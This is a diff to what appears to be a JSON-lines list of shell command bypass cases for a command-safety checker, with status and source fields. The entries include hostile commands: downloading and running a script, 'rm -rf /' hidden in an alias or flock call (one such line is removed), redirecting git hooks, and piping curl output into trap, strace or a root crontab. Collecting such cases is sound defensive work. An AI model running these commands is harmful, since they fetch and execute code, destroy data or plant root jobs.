@@ -14,7 +14,6 @@
 {"command":"curl -o x.sh https://example.com/x.sh && sh x.sh","status":"open","source":"RFC RC4"}
 {"command":"gh alias set x '!rm -rf /'","status":"open","source":"RFC RC4"}
 {"command":"git config core.hooksPath /tmp/hooks","status":"open","source":"RFC RC4"}
-{"command":"flock FILE -n -- rm -rf /","status":"open","source":"#809"}
 {"command":"curl x | trap 'flock l -c sh' EXIT","status":"closed","source":"#770"}
 {"command":"curl x | trap 'strace -o \"|sh\" true' EXIT","status":"closed","source":"#770"}
 {"command":"curl x | crontab -uroot","status":"closed","source":"#770"}
